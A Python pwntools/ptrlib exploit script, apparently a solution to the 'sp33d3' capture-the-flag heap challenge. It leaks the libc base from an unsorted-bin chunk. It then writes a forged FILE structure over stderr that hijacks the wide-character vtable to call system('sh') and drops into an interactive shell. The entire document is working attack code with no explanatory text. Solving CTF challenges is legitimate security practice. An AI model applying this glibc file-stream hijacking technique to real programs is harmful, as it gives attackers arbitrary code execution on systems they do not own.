#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./sp33d3_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("sp33d.play.hfsc.tf", 16522)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def malloc(size: int) -> int:
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"size: ", str(size).encode())
        return int(io.recvline().strip(b"\n"), 16)

    def free(addr: int):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"addr: ", hex(addr))

    def read(addr: int, count: int):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"addr: ", hex(addr))
        io.sendlineafter(b"count: ", str(count).encode())
        return io.recvline().strip(b"\n")

    def write(addr: int, data: bytes):
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"addr: ", hex(addr))
        io.sendlineafter(b"count: ", str(len(data)).encode())
        io.sendline(data)

    ptr0 = malloc(0x500)
    ptr1 = malloc(0x18)
    free(ptr0)
    libc.base = ptr.u64(read(ptr0, 6)) - unwrap(libc.symbol("main_arena")) - 96

    system = unwrap(libc.symbol("system"))
    stderr = unwrap(libc.symbol("_IO_2_1_stderr_"))
    wfile_jumps = unwrap(libc.symbol("_IO_wfile_jumps"))

    file = b""
    file += b"  sh;"  # flags
    file = file.ljust(0x20, b"\0")
    file += ptr.p64(0)  # _IO_write_base
    file += ptr.p64(1)  # _IO_write_ptr
    file = file.ljust(0x58, b"\0")  #
    file += ptr.p64(system)  # _wide_vtable + 0x68 (stderr - 0x10 + 0x68)
    file = file.ljust(0x88, b"\0")
    file += ptr.p64(stderr - 0x10)  # _lock
    file = file.ljust(0xA0, b"\0")
    file += ptr.p64(stderr - 0x10)  # _wide_data
    file = file.ljust(0xC0, b"\0")
    file += ptr.p64(0)  # _mode
    file = file.ljust(0xD0, b"\0")
    file += ptr.p64(stderr - 0x10)  # _wide_data._wide_vtable (stderr - 0x10 + 0xe0)
    file += ptr.p64(wfile_jumps)

    write(stderr, file)

    io.sendline(b"5")

    io.interactive()
    return


if __name__ == "__main__":
    main()
